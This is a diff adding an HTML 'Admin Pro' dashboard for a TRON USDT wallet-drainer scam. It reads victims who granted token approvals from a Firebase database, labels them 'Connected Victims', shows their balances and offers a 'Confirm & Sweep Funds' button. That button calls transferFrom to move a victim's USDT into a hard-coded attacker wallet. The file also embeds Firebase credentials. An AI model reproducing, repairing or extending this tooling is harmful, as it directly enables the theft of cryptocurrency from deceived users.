@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Admin Pro - Real-time Tracker</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .active-pulse {
+            position: relative;
+        }
+
+        .active-pulse::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+            }
+
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 10px rgba(16, 185, 129, 0);
+            }
+
+            100% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
+            }
+        }
+
+        .user-card {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .user-card:active {
+            transform: scale(0.98);
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .swipe-indicator {
+            height: 4px;
+            width: 40px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin: 8px auto;
+        }
+    </style>
+</head>
+
+<body class="p-0 m-0 min-h-screen">
+
+    <!-- Login Screen -->
+    <div id="loginScreen" class="fixed inset-0 z-[100] bg-black flex items-center justify-center p-6">
+        <div class="w-full max-w-sm space-y-8 text-center">
+            <div class="space-y-2">
+                <div
+                    class="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto shadow-2xl shadow-blue-600/20 mb-6">
+                    <i class="fas fa-lock text-2xl"></i>
+                </div>
+                <h2 class="text-3xl font-black tracking-tighter">Admin <span class="text-blue-500">Access</span></h2>
+                <p class="text-slate-500 text-xs font-bold uppercase tracking-widest">Authorized Personnel Only</p>
+            </div>
+
+            <div class="space-y-4">
+                <input type="password" id="adminPass" placeholder="Enter Security Code"
+                    class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-center text-lg font-bold focus:outline-none focus:border-blue-500 transition-all">
+                <button onclick="checkPass()"
+                    class="w-full bg-blue-600 hover:bg-blue-500 text-white font-black py-5 rounded-2xl shadow-xl shadow-blue-900/20 active:scale-95 transition-all uppercase tracking-widest text-xs">
+                    Unlock Dashboard
+                </button>
+            </div>
+            <p id="loginError" class="text-red-500 text-[10px] font-black uppercase tracking-widest hidden">Access Denied:
+                Invalid Code</p>
+        </div>
+    </div>
+
+    <!-- Top Bar -->
+    <div id="mainDashboard" class="hidden">
+        <div class="fixed top-0 left-0 right-0 z-50 glass px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center active-pulse">
+                    <i class="fas fa-shield-alt text-sm"></i>
+                </div>
+                <h1 class="text-lg font-extrabold tracking-tight">Admin<span class="text-blue-500">PRO</span></h1>
+            </div>
+            <div class="flex items-center gap-4">
+                <button onclick="toggleAudio()" id="audioBtn" class="text-slate-400 hover:text-white transition-colors">
+                    <i class="fas fa-bell"></i>
+                </button>
+                <div
+                    class="text-[10px] font-black bg-blue-500/20 text-blue-400 px-2 py-1 rounded-full border border-blue-500/30 uppercase">
+                    Live</div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <main class="pt-24 pb-32 px-4 space-y-4">
+            <div class="grid grid-cols-2 gap-3 mb-6">
+                <div class="glass p-4 rounded-3xl">
+                    <div class="text-slate-500 text-[10px] font-black uppercase tracking-widest mb-1">Total USDT</div>
+                    <div id="totalUsdt" class="text-xl font-bold text-emerald-400">$0.00</div>
+                </div>
+                <div class="glass p-4 rounded-3xl">
+                    <div class="text-slate-500 text-[10px] font-black uppercase tracking-widest mb-1">Users</div>
+                    <div id="userCount" class="text-xl font-bold text-blue-400">0</div>
+                </div>
+            </div>
+            <h2 class="text-xs font-black uppercase text-slate-500 tracking-[0.2em] px-2 mb-2">Connected Victims</h2>
+            <div id="userList" class="space-y-3"></div>
+        </main>
+
+        <!-- Bottom Action Sheet -->
+        <div id="actionSheet"
+            class="fixed bottom-0 left-0 right-0 z-50 glass rounded-t-[40px] px-6 pb-10 transform translate-y-full transition-transform duration-500 ease-out border-t border-white/10">
+            <div class="swipe-indicator"></div>
+            <div class="flex justify-between items-start mt-6 mb-6">
+                <div>
+                    <h3 id="sheetAddress" class="text-sm font-mono text-blue-400 font-bold mb-1">T...</h3>
+                    <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Ready for execution</p>
+                </div>
+                <button onclick="closeSheet()" class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center">
+                    <i class="fas fa-times text-xs text-slate-400"></i>
+                </button>
+            </div>
+            <div class="space-y-4">
+                <div class="flex justify-between p-4 bg-white/5 rounded-2xl">
+                    <div class="text-xs text-slate-400 font-bold">Balance</div>
+                    <div id="sheetUsdt" class="text-lg font-black text-emerald-400">0.00 USDT</div>
+                </div>
+                <div class="flex flex-col gap-2">
+                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-2">Sweep Amount</label>
+                    <input id="sweepInput" type="number" step="any"
+                        class="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-sm font-bold focus:outline-none focus:border-blue-500">
+                </div>
+                <button id="sweepBtn" onclick="executeSweep()"
+                    class="w-full bg-blue-600 text-white font-black py-5 rounded-[24px] uppercase tracking-widest text-xs">Confirm
+                    & Sweep Funds</button>
+            </div>
+        </div>
+    </div>
+
+    <audio id="bellSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
+            authDomain: "tronadmin-99827.firebaseapp.com",
+            databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
+            projectId: "tronadmin-99827",
+            storageBucket: "tronadmin-99827.firebasestorage.app",
+            messagingSenderId: "500883948250",
+            appId: "1:500883948250:web:203f69935a6825d09b5be3"
+        };
+
+        const CONFIG = {
+            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
+            PASS_HASH: "6de32b16d8fa5a4ff4f64bc471d9993e2ff594033fe43aa4622a753bcde5a38e"
+        };
+
+        let users = [];
+        let audioEnabled = false;
+        let selectedUser = null;
+
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        async function checkPass() {
+            const input = document.getElementById('adminPass').value;
+            const hash = await sha256(input);
+            if (hash === CONFIG.PASS_HASH) {
+                document.getElementById('loginScreen').classList.add('hidden');
+                document.getElementById('mainDashboard').classList.remove('hidden');
+                localStorage.setItem('adminAuth', 'true');
+                startApp();
+            } else {
+                const err = document.getElementById('loginError');
+                err.classList.remove('hidden');
+                setTimeout(() => err.classList.add('hidden'), 2000);
+            }
+        }
+
+        function toggleAudio() {
+            audioEnabled = !audioEnabled;
+            document.getElementById('audioBtn').className = audioEnabled ? 'text-blue-500' : 'text-slate-400';
+            if (audioEnabled) document.getElementById('bellSound').play().catch(() => { });
+        }
+
+        function startApp() {
+            if (firebase.apps.length === 0) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            const db = firebase.database();
+
+            db.ref('connections').on('child_added', (snapshot) => {
+                const user = snapshot.val();
+                if (!users.find(u => u.address === user.address)) {
+                    users.unshift(user);
+                    if (audioEnabled) document.getElementById('bellSound').play().catch(() => { });
+                    renderUsers();
+                }
+            });
+        }
+
+        function renderUsers() {
+            const list = document.getElementById('userList');
+            list.innerHTML = '';
+            let total = 0;
+            users.forEach(u => {
+                total += parseFloat(u.usdt);
+                const card = document.createElement('div');
+                card.className = "glass p-5 rounded-3xl user-card flex justify-between items-center cursor-pointer";
+                card.onclick = () => openSheet(u);
+                card.innerHTML = `
+                    <div class="flex items-center gap-4">
+                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center"><i class="fab fa-ethereum text-blue-400"></i></div>
+                        <div>
+                            <div class="text-sm font-mono font-bold">${u.address.substring(0, 6)}...${u.address.substring(30)}</div>
+                            <div class="text-[9px] text-slate-500 font-bold uppercase tracking-wider">${u.time} • ${u.trx} TRX</div>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-md font-black text-emerald-400">$${u.usdt}</div>
+                        <div class="text-[8px] text-slate-500 font-black uppercase">Approved</div>
+                    </div>
+                `;
+                list.appendChild(card);
+            });
+            document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
+            document.getElementById('userCount').innerText = users.length;
+        }
+
+        function openSheet(user) {
+            selectedUser = user;
+            document.getElementById('sheetAddress').innerText = user.address;
+            document.getElementById('sheetUsdt').innerText = `${user.usdt} USDT`;
+            document.getElementById('sweepInput').value = user.usdt;
+            document.getElementById('actionSheet').style.transform = 'translateY(0)';
+        }
+
+        function closeSheet() {
+            document.getElementById('actionSheet').style.transform = 'translateY(100%)';
+        }
+
+        async function executeSweep() {
+            if (!window.tronWeb) return alert("Please open this in TronLink!");
+            const amount = document.getElementById('sweepInput').value;
+            const btn = document.getElementById('sweepBtn');
+            try {
+                btn.disabled = true;
+                btn.innerText = "Processing...";
+                const tron = window.tronWeb;
+                const contract = await tron.contract().at(CONFIG.USDT);
+                const amountInSun = Math.floor(amount * 1000000);
+                const tx = await contract.transferFrom(selectedUser.address, CONFIG.ADMIN_WALLET, amountInSun).send({ feeLimit: 150000000 });
+                alert("Withdrawal Successful!\nTXID: " + tx);
+                closeSheet();
+            } catch (err) {
+                alert("Execution Failed: " + (err.message || "Rejected"));
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "Confirm & Sweep Funds";
+            }
+        }
+
+        if (localStorage.getItem('adminAuth') === 'true') {
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('mainDashboard').classList.remove('hidden');
+            window.onload = startApp;
+        }
+    </script>
+</body>
+
+</html>
